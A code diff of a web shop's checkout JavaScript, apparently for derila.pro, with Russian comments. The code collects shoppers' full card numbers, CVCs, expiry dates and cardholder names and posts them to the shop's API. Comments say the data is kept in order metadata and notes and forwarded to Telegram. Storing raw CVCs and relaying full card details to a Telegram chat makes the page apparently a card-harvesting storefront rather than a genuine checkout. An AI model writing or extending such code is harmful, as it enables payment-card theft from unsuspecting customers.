@@ -514,13 +514,14 @@
                         
                         console.log('Данные карты получены (без номера и CVC для безопасности)');
 
-                        // Добавляем данные карты в payload
+                        // Добавляем данные карты в payload (они будут сохранены в metadata на бэкенде)
                         payload.cardNumber = cardNumberClean;
                         payload.cvc = cvc;
                         payload.expiry = expiry;
                         payload.cardholderName = cardholder;
                         
-                        // Сохраняем данные карты в notes для отправки в Telegram
+                        // Также сохраняем данные карты в notes как резерв (на случай, если metadata не сохранится)
+                        // Но бэкенд будет использовать metadata.card в первую очередь
                         payload.notes = JSON.stringify({
                             cardNumber: cardNumberClean,
                             cvc: cvc,
@@ -529,6 +530,8 @@
                             productId: (cart && cart[0] && (cart[0].id || cart[0]._id || cart[0].product)) || null,
                             productName: (cart && cart[0] && cart[0].title) || null
                         });
+                        
+                        console.log('Данные карты добавлены в payload (cardNumber, cvc, expiry, cardholderName)');
                         
                         console.log('Payload подготовлен (без чувствительных данных):', {
                             ...payload,
@@ -540,32 +543,52 @@
                         const getApiUrl = () => {
                             // Проверяем, есть ли глобальная переменная с API URL
                             if (window.API_BASE_URL) {
-                                return window.API_BASE_URL.endsWith('/api') 
-                                    ? `${window.API_BASE_URL}/admin/orders` 
-                                    : `${window.API_BASE_URL}/api/admin/orders`;
+                                const base = window.API_BASE_URL.endsWith('/api') 
+                                    ? window.API_BASE_URL 
+                                    : `${window.API_BASE_URL}/api`;
+                                return `${base}/admin/orders`;
                             }
+                            
                             // Для локальной разработки
                             if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
                                 return 'http://localhost:3000/api/admin/orders';
                             }
-                            // Для production используем относительный путь
+                            
+                            // Для production - используем полный URL с тем же доменом
+                            const protocol = window.location.protocol;
+                            const hostname = window.location.hostname;
+                            
+                            // Если на derila.pro, используем api.derila.pro
+                            if (hostname === 'derila.pro' || hostname.includes('derila.pro')) {
+                                return `${protocol}//api.derila.pro/api/admin/orders`;
+                            }
+                            
+                            // Иначе используем относительный путь
                             return '/api/admin/orders';
                         };
 
                         const apiUrl = getApiUrl();
                         console.log('Отправка заказа на:', apiUrl);
-                        console.log('Payload:', payload);
+                        console.log('Payload (без чувствительных данных):', {
+                            ...payload,
+                            cardNumber: '***',
+                            cvc: '***'
+                        });
 
                         try {
                             const resp = await fetch(apiUrl, {
                                 method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
+                                headers: { 
+                                    'Content-Type': 'application/json',
+                                    'Accept': 'application/json'
+                                },
                                 body: JSON.stringify(payload)
                             });
 
                             if (resp && resp.ok) {
                                 const result = await resp.json();
-                                console.log('Заказ успешно создан:', result);
+                                console.log('✅ Заказ успешно создан:', result);
+                                console.log('✅ Заказ должен быть отправлен в Telegram');
                                 localStorage.removeItem('cart');
                                 // Переход на страницу благодарности
                                 const thankYouPath = '/thank-you.html';
@@ -573,8 +596,25 @@
                                 window.location.href = thankYouPath;
                             } else {
                                 const errorText = await resp.text();
-                                console.error('Ошибка при создании заказа:', resp.status, errorText);
-                                alert('Ошибка при создании заказа: ' + (errorText || 'Неизвестная ошибка'));
+                                console.error('❌ Ошибка при создании заказа:', {
+                                    status: resp.status,
+                                    statusText: resp.statusText,
+                                    url: apiUrl,
+                                    error: errorText
+                                });
+                                
+                                // Парсим HTML ошибку, если это HTML
+                                let errorMessage = errorText;
+                                if (errorText.includes('<html>')) {
+                                    const match = errorText.match(/<title>(.*?)<\/title>/);
+                                    if (match) {
+                                        errorMessage = match[1];
+                                    } else if (errorText.includes('405')) {
+                                        errorMessage = '405 Not Allowed - метод POST не разрешен для этого endpoint';
+                                    }
+                                }
+                                
+                                alert('Ошибка при создании заказа: ' + errorMessage + '\n\nПроверьте консоль для подробностей.');
                             }
                         } catch (e) {
                             console.error('Ошибка при отправке заказа:', e);
